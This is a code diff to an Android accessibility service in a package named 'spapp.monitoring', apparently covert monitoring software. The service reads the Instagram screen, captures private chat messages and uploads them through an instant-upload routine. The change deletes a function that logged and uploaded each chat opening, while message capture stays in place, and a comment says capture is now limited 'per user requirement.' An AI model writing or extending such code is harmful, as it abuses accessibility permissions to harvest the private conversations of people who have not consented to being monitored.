@@ -473,7 +473,6 @@ class BlockAccessibilityService : AccessibilityService() {
                                 lastClickedInstagramChat = title
                                 lastClickedInstagramChatTime = System.currentTimeMillis()
                                 currentInstagramChatSeenSignatures.clear()
-                                recordInstagramChatOpened(title)
                             }
                         }
                     } else {
@@ -881,7 +880,6 @@ class BlockAccessibilityService : AccessibilityService() {
                                     lastClickedInstagramChatTime = System.currentTimeMillis()
                                     lastActiveInstagramChatForSignatures = titleCand
                                     currentInstagramChatSeenSignatures.clear()
-                                    recordInstagramChatOpened(titleCand)
                                     pollHandler.postDelayed({
                                         recordInstagramChatIfForeground(getInstagramWindowRoot())
                                     }, 300L)
@@ -1766,34 +1764,7 @@ class BlockAccessibilityService : AccessibilityService() {
     }
 
     private fun recordInstagramChatOpened(chatTitle: String) {
-        if (chatTitle.isBlank() || isInstagramReservedTitle(chatTitle)) return
-        val now = System.currentTimeMillis()
-        val key = "ig_open|$chatTitle"
-        if (shouldCaptureMessage(key, 3_000L)) {
-            scope.launch {
-                try {
-                    val db = AppDatabase.getInstance(applicationContext)
-                    val existing = db.instagramMessageDao().findExistingRecent(
-                        chatTitle, "Opened chat", false, now - 60_000L
-                    )
-                    if (existing == null) {
-                        db.instagramMessageDao().insertAll(
-                            listOf(
-                                InstagramMessageEntry(
-                                    chatName = chatTitle,
-                                    sender = chatTitle,
-                                    messageText = "Opened chat",
-                                    isOutgoing = false,
-                                    messageTimeEpochMs = now,
-                                    mediaType = "text"
-                                )
-                            )
-                        )
-                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext, immediate = true)
-                    }
-                } catch (_: Exception) {}
-            }
-        }
+        // Disabled per user requirement: Instagram contacts are ONLY captured when real messages are sent or received.
     }
 
     private fun recordInstagramDirectListIfVisible(root: AccessibilityNodeInfo?) {
@@ -2429,7 +2400,6 @@ class BlockAccessibilityService : AccessibilityService() {
         if (!chatTitle.equals(lastActiveInstagramChatForSignatures, ignoreCase = true)) {
             lastActiveInstagramChatForSignatures = chatTitle
             currentInstagramChatSeenSignatures.clear()
-            recordInstagramChatOpened(chatTitle)
         }
 
         try {
@@ -2640,8 +2610,6 @@ class BlockAccessibilityService : AccessibilityService() {
                         Log.e("BlockA11y", "Failed to insert captured Instagram messages", e)
                     }
                 }
-            } else {
-                recordInstagramChatOpened(chatTitle)
             }
         } catch (_: Exception) {}
     }
